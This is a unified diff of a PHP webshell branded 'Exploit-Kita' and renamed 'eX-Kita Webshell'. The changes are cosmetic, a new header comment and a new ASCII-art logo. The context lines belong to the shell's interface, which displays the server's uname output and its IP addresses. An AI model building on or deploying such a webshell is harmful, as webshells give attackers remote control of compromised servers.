@@ -8,7 +8,7 @@
 ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║      ██║  ██╗██║   ██║   ██║  ██║
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝
 
-# Exploit-Kita Webshell, Copyright © by Exploit-Kita
+# eX-Kita Webshell (Exploit-Kita Webshell) - Copyright © by Exploit-Kita
 # FB : fb.com/ExploitKita/
 # Website : exploit-kita.org
 # Blog : exploitkita.org
@@ -483,13 +483,16 @@ if (isset($_GET["feature"])) {
         <div id="shell">
             <pre id="shell-content"><div id="shell-logo">
 			<a href="//exploit-kita.org" target="_blank" style="text-decoration: none;color: red;">
-███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗   ██╗  ██╗██╗████████╗ █████╗ 
-██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝   ██║ ██╔╝██║╚══██╔══╝██╔══██╗
-█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║█████╗█████╔╝ ██║   ██║   ███████║
-██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║╚════╝██╔═██╗ ██║   ██║   ██╔══██║
-███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║      ██║  ██╗██║   ██║   ██║  ██║
-╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝
-			</a>
+           __    __         __    __  __    __               
+          /  |  /  |       /  |  /  |/  |  /  |              
+  ______  $$ |  $$ |       $$ | /$$/ $$/  _$$ |_     ______  
+ /      \ $$  \/$$/ ______ $$ |/$$/  /  |/ $$   |   /      \ 
+/$$$$$$  | $$  $$< /      |$$  $$<   $$ |$$$$$$/    $$$$$$  |
+$$    $$ |  $$$$  \$$$$$$/ $$$$$  \  $$ |  $$ | __  /    $$ |
+$$$$$$$$/  $$ /$$  |       $$ |$$  \ $$ |  $$ |/  |/$$$$$$$ |
+$$       |$$ |  $$ |       $$ | $$  |$$ |  $$  $$/ $$    $$ |
+ $$$$$$$/ $$/   $$/        $$/   $$/ $$/    $$$$/   $$$$$$$/ 
+eX-Kita Webshell</a>
 <?php
 echo "<font color='lightblue'>System : <b>".php_uname()."</b></font><br>";
 echo "<font color='lime'>IP Server : <b>".htmlspecialchars($_SERVER['SERVER_ADDR'])."</b> | My IP : <b>".htmlspecialchars($_SERVER['REMOTE_ADDR'])."</b></font>";
